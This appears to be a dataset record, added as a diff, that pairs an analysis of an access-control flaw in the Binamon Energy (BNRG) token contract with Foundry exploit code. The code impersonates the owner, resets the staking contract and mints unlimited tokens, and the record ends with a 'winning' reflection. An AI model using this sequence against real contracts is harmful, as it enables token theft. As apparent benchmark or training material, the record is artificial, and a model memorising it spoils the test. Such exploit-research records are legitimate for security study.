@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The `deliver` function in the Binamon Energy (BNRG) contract has an `onlyStakingContract` modifier. However, the contract owner can arbitrarily change the staking contract address via the `setStakingContract` function. This allows an attacker who can impersonate the owner to set their own address as the staking contract and then call `deliver` to mint unlimited tokens.",
+  "interface_arsenal": "interface IBNRG {\n    function owner() external view returns (address);\n    function setStakingContract(address stakingContractAddress_) external;\n    function deliver(address user, uint256 numTokens) external;\n    function balanceOf(address account) external view returns (uint256);\n}",
+  "attack_sequence": "address owner = bnrg.owner();\n\nvm.startPrank(owner);\nbnrg.setStakingContract(attacker);\nvm.stopPrank();\n\nbnrg.deliver(attacker, amountToMint);",
+  "winning_reflection": "The core insight was that the privileged `setStakingContract` function completely undermined the security of the `deliver` function's `onlyStakingContract` modifier. By gaining control of the owner address, it was possible to designate the attacker as the authorized 'staking contract', thereby gaining access to the powerful minting functionality of `deliver`."
+}
